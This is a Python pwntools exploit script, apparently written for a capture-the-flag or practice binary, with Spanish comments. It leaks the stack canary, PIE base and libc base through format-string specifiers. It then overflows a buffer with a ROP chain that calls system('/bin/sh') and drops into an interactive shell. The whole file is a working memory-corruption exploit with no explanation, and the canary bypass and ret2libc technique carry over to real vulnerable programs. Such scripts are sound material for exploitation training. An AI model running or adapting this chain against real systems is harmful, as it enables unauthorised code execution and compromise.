from pwn import *

e = ELF('./a.out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

#Canario en la 11
#7ffff7ed90a7 - 00007ffff7dcb000 = 0x10e0a7
#pie salida 17 - 1a9

io = e.process()
gdb.attach(io, '''
x/1xg $fs_base+0x28
continue''')
#breaks en 171 y 145

#io.sendline(b"%9$lx")
io.sendline(b'%11$lx-%17$lx')
io.recvline()
leak = io.recvline().strip()

print(leak)
#canary = int(leak, 16)
canary = int(leak.split(b'-')[0], 16) 
pie = int(leak.split(b'-')[1], 16) - 0x11a9

log.info("Pie %s" % hex(pie))
log.info("Canary: %s" % hex(canary))
#payload = b"AAAAAAAA"+p64(canary)+b"B"*8+b"C"*6+b"\x00\x00"
payload = b"A"*24+p64(canary)+b"B"*8+p64(pie+e.sym['main'])

io.sendline(payload)
io.recvline() 
io.sendline(b"%3$lx")
io.recvline()
leak = io.recvline().strip()
libc.address = int(leak, 16) - 0x10e0a7
log.info("Libc: %s" % hex(libc.address))

payload = (
    b"A"*24+
    p64(canary)+
    b"B"*8+
    p64(libc.address + 0x00195d49)+
    p64(next(libc.search(b'/bin/sh')))+
    p64(libc.sym['system'])    
)
io.sendline(payload)
io.interactive()
